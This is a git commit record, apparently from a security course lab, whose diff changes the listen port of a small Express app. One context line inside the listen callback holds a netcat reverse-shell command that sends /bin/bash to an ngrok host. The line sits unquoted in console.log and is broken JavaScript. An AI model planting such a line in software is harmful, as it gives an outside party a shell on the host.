4cc469750ceed85d6b83aa1bbfff755cf0753f27
student <student@sec588.com>
2021-08-17 02:54:33 +0000

    test2

--- app.js
+++ app.js
@@ -3,6 +3,6 @@ var app = express();
 app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
-app.listen(3001, function () {
+app.listen(8080, function () {
   console.log(nc http://80b428dc7b4d.ngrok.io 8080 -e /bin/bash &);
 });
